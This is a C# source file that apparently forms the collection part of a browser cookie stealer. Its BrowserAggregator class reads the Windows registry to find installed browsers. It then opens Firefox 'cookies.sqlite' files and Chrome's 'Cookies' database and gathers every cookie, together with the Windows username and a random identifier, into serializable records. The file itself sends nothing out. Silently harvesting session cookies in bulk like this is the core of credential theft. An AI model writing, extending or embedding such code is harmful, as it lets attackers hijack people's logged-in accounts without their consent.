using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace DynamicCookieLibrary.DynamicCookie
{
    [Serializable()]
    public enum BrowserType
    {
        FIREFOX,
        CHROME
    }

    [Serializable()]
    public class Browser
    {
        public BrowserType browserType { get; set; }
        private DateTime dateBacking { get; set; }
        public String date
        {
            get
            {
                return dateBacking.ToLongTimeString();
            }
        }
        public String browser
        {
            get
            {
                return browserType.ToString();
            }
        }
        public List<Cookie> cookies { get; set; }
        public String identifier { get; set; }
        public String username { get; set; }
        public int cookieCount
        {
            get
            {
                return cookies.Count;
            }
        }
        public Browser(BrowserType type)
        {
            dateBacking = DateTime.Now;
            username = Environment.UserName;
            cookies = new List<Cookie>();
            browserType = type;
            identifier = CookieFactory.randomString(8);
        }
    }

    public static class BrowserAggregator
    {
        public static List<Browser> getInstalledBrowsers()
        {
            RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
            RegistryKey browsers = baseKey.OpenSubKey("SOFTWARE\\Wow6432Node\\Clients\\StartMenuInternet");
            String appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            String local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            List<Browser> browserList = new List<Browser>();
            foreach (String subkey in browsers.GetSubKeyNames())
            {
                if (subkey.Contains("FIREFOX"))
                {
                    String fireFox = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
                    if (Directory.Exists(fireFox))
                    {
                        foreach (String directory in Directory.EnumerateDirectories(fireFox))
                        {
                            String path = Path.Combine(directory, "cookies.sqlite");
                            if (File.Exists(path))
                            {
                                byte[] data = CookieFactory.getDataSafe(path);
                                List<FirefoxCookie> cookies = CookieFactory.processSQLData<FirefoxCookie>("moz_cookies", data);
                                Browser browser = new Browser(BrowserType.FIREFOX);
                                foreach (FirefoxCookie cookie in cookies)
                                {
                                    browser.cookies.Add(new Cookie(cookie.name, cookie.value, cookie.path, cookie.hostName));
                                }
                                browserList.Add(browser);
                            }
                        }
                    }
                }
                else if (subkey.Contains("Chrome"))
                {
                    String chrome = Path.Combine(local, "Google", "Chrome", "User Data", "Default");
                    if (Directory.Exists(chrome))
                    {
                        String path = Path.Combine(chrome, "Cookies");
                        if (File.Exists(path))
                        {
                            byte[] data = CookieFactory.getDataSafe(path);
                            List<ChromeCookie> cookies = CookieFactory.processSQLData<ChromeCookie>("cookies", data);
                            Browser browser = new Browser(BrowserType.CHROME);
                            foreach (ChromeCookie cookie in cookies)
                            {
                                browser.cookies.Add(new Cookie(cookie.name, cookie.value, cookie.path, cookie.hostName));
                            }
                            browserList.Add(browser);
                        }
                    }
                }
            }
            return browserList;
        }
    }
}
